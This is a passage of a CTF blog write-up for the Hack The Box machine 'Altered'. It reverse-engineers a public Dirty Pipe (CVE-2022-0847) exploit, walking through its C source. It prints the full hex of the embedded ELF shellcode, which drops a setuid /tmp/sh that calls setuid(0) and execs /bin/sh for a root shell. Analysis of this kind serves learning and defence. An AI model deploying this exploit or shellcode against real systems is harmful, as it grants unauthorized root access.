+[+] dropping suid shell..
+[+] restoring suid binary..
+[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
+</span><span class="gp">#</span><span class="w">
+</span></code></pre></div></div>
+<p>It’s not clear from that what it’s doing, but I’ll look at that in <a href="#beyond-root---dirty-pipe-exploit-2">Beyond Root</a>.</p>
+<h2 id="beyond-root---dirty-pipe-exploit-2">Beyond Root - Dirty Pipe “exploit-2”</h2>
+<h3 id="source">Source</h3>
+<p>Looking at bit more closely at the <a href="https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c">source</a> for <code class="language-plaintext highlighter-rouge">exploit-2.c</code>. The <code class="language-plaintext highlighter-rouge">main</code> function is starts by checking for the required arg and printing the help and exiting if it’s not there:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Usage: %s SUID</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>The arg is stored in <code class="language-plaintext highlighter-rouge">path</code>, and that file is opened, with the file descriptor stored in <code class="language-plaintext highlighter-rouge">fd</code>. Then it gets a buffer the size of <code class="language-plaintext highlighter-rouge">elfcode</code> (which I’ll show in a minute) named <code class="language-plaintext highlighter-rouge">orig_bytes</code>. It seeks one byte into the legit file, and reads the size of <code class="language-plaintext highlighter-rouge">elfcode</code> into <code class="language-plaintext highlighter-rouge">orig_bytes</code> and closes the file descriptor. This is a backup of the original file:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">char</span> <span class="o">*</span><span class="n">path</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">elfcode</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">orig_bytes</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">elfcode</span><span class="p">));</span>
+    <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">orig_bytes</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">elfcode</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Next it calls <code class="language-plaintext highlighter-rouge">hax(path, 1, elfcode, sizeof(elfcode))</code>. Presumably, this writes <code class="language-plaintext highlighter-rouge">elfcode</code> into the SUID binary starting at the second byte (because the exploit can’t write the first byte).</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] hijacking suid binary..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hax</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">elfcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">elfcode</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[~] failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>Then it runs the given binary, and then uses <code class="language-plaintext highlighter-rouge">hax</code> to write the original bytes back into the SUID binary, effectively restoring it:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] dropping suid shell..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] restoring suid binary..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hax</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">orig_bytes</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">elfcode</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[~] failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>Finally, it runs <code class="language-plaintext highlighter-rouge">/tmp/sh</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] popping root shell.. (dont forget to clean up /tmp/sh ;))</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/sh"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+<span class="err">}</span>
+</code></pre></div></div>
+<h3 id="re-elfcode">RE elfcode</h3>
+<p><code class="language-plaintext highlighter-rouge">elfcode</code> is in the code as a string of hex bytes:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220325100948025.webp" type="image/webp"/>
+<img alt="image-20220325100948025" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220325100948025.png"/>
+</picture>
+<p>I’ll grab the hex, drop it into <code class="language-plaintext highlighter-rouge">vim</code>, and use some quick macros to clean it up to a long hex string:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000970100000000000097010000000000000010000000000000488d3d5600000048c7c64102000048c7c0020000000f054889c7488d354400000048c7c2ba00000048c7c0010000000f0548c7c0030000000f05488d3d1c00000048c7c6ed09000048c7c05a0000000f054831ff48c7c03c0000000f052f746d702f7368007f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000ba00000000000000ba0000000000000000100000000000004831ff48c7c0690000000f054831ff48c7c06a0000000f05488d3d1b0000006a004889e2574889e648c7c03b0000000f0548c7c03c0000000f052f62696e2f736800
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">xxd</code> will decode that to a raw binary:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>xxd <span class="nt">-r</span> <span class="nt">-p</span> elfcode <span class="o">&gt;</span> elf
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>file elf
+<span class="go">elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+</span></code></pre></div></div>
+<p>I’ll open that in Ghidra, and there’s only one function, <code class="language-plaintext highlighter-rouge">entry</code>. The decompile isn’t super useful:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220325101251096.webp" type="image/webp"/>
+<img alt="image-20220325101251096" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220325101251096.png"/>
+</picture>
+<p>Still, it is just five <code class="language-plaintext highlighter-rouge">syscall</code> calls. In the listing, what’s actually happening is clearer. Each <code class="language-plaintext highlighter-rouge">syscall</code> looks like this:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220325101346001.webp" type="image/webp"/>
+<img alt="image-20220325101346001" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220325101346001.png"/>
+</picture>
+<p>I can clean that up to:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x241</span><span class="p">,</span> <span class="s">"/tmp/sh"</span><span class="p">)</span>
+<span class="n">syscall</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">)</span>
+<span class="n">syscall</span><span class="p">(</span><span class="mh">0x3</span><span class="p">,</span> <span class="n">fd</span><span class="p">)</span>
+<span class="n">syscall</span><span class="p">(</span><span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x9ed</span><span class="p">,</span> <span class="s">"/tmp/sh"</span><span class="p">)</span>
+<span class="n">syscall</span><span class="p">(</span><span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Using <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit">this handy table</a> I can convert that to the following pseudocode:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/tmp/sh"</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="mh">0x241</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x4000dd</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">)</span>
+<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/sh"</span><span class="p">,</span> <span class="mh">0x9ed</span><span class="p">)</span> <span class="c1">// 0x9ed == 4755 in octal</span>
+<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The buffer at 0x4000dd is another ELF:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220325102111276.webp" type="image/webp"/>
+<img alt="image-20220325102111276" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220325102111276.png"/>
+</picture>
+<p>0x4000dd + 0xba = 0x400197, which is where this file ends:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220325102211513.webp" type="image/webp"/>
+<img alt="image-20220325102211513" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220325102211513.png"/>
+</picture>
+<h3 id="re-tmpsh">RE /tmp/sh</h3>
+<p>I’ll grab a copy of <code class="language-plaintext highlighter-rouge">/tmp/sh</code> from Altered, or highlight this space in Ghidra –&gt; right click –&gt; Copy Special –&gt; Byte String (No Spaces), and then <code class="language-plaintext highlighter-rouge">xxd -r -p</code> it to get a binary. It’s another binary with a single function, <code class="language-plaintext highlighter-rouge">entry</code>, and this time four syscalls:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">syscall</span><span class="p">(</span><span class="mh">0x69</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="n">syscall</span><span class="p">(</span><span class="mh">0x6a</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="n">syscall</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">,</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="p">[</span><span class="s">"/bin/sh"</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="n">syscall</span><span class="p">(</span><span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x4000b2</span><span class="p">);</span>
+</code></pre></div></div>
+<p>This simplifies to:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="p">[</span><span class="s">"/bin/sh"</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="n">exit</span><span class="p">(</span><span class="mh">0x4000b2</span><span class="p">)</span>
+</code></pre></div></div>
+<p>So it’s ensuring it has root user and group privs and calling <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/03/30/htb-altered.html"></a>
+</article>
